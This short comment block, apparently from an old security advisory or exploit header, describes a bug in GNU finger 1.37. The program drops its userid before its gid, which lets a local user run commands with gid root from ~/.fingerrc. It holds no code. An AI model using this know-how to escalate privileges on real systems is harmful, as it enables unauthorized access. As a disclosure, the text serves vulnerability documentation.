# There is a bug in  the `lib/site/userinfo.c'
# module of GNU  finger version 1.37 allowing
# any user on  a system to  execute arbitrary
# commands with gid root from  ~/.fingerrc.
# The problem is that  GNU finger  *first*
# changes   its  userid  thus   giving  away
# root privileges and *then* tries to change
# its gid which will not succeed.
